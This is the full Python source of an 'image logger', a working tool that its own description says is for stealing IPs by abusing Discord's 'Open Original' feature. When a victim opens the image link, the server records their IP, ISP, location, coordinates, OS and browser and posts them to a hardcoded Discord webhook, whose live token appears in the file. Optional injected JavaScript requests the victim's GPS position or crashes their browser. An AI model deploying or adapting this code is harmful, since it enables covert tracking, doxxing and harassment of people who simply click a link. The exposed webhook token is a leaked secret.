# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1398278465375178863/DXAsEcC0q7F7QMyUWXQ9RtPv4YZG09QGwOcAgn6-S2K4S4fC0dv6SDWCh9DP26uHDnPm",
    "image": "data:image/png;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
